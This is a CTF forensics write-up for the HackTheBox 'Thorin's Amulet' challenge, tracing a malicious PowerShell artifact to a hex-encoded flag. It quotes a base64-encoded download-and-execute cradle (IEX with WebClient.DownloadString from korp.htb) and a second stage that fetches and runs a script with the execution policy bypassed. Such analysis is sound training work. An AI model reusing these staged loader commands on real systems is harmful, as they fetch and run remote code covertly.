---
title: Thorin’s Amulet
tags:
  - CTF
  - HackTheBox
  - CyberApocalypse
  - Forensics
  - Decrypting
date: 2025-03-21T00:00:00Z
---
Garrick and Thorin’s visit to Stonehelm took an unexpected turn when Thorin’s old rival, Bron Ironfist, challenged him to a forging contest. In the end Thorin won the contest with a beautifully engineered clockwork amulet but the victory was marred by an intrusion. Saboteurs stole the amulet and left behind some tracks. Because of that it was possible to retrieve the malicious artifact that was used to start the attack. Can you analyze it and reconstruct what happened? Note: make sure that domain korp.htb resolves to your docker instance IP and also consider the assigned port to interact with the service.

I found a base64 string inside the `artifact.ps1`:

```shell
function qt4PO {
    if ($env:COMPUTERNAME -ne "WORKSTATION-DM-0043") {
        exit
    }
    powershell.exe -NoProfile -NonInteractive -EncodedCommand "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik="
qt4PO
```

If I decode it from base64:

```shell
SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik=
# from base64
IEX (New-Object Net.WebClient).DownloadString("http://korp.htb/update")
```

Now I visited the page: `korp.htb:38660/update` and it downloaded a file:

```shell
strings update.ps1 

function aqFVaq {
    Invoke-WebRequest -Uri "http://korp.htb/a541a" -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} -Method GET -OutFile a541a.ps1
    powershell.exe -exec Bypass -File "a541a.ps1"
aqFVaq
```

Now I captured the request to `http://korp.htb/a541a` and added the new secret header:

![](Pasted%20image%2020250322121959.png)

```shell
$a35 = "4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d"
($a35-split"(..)"|?{$_}|%{[char][convert]::ToInt16($_,16)}) -join ""
```

It seems to be a powershell script that decodes the message from hex:

![](Pasted%20image%2020250322122158.png)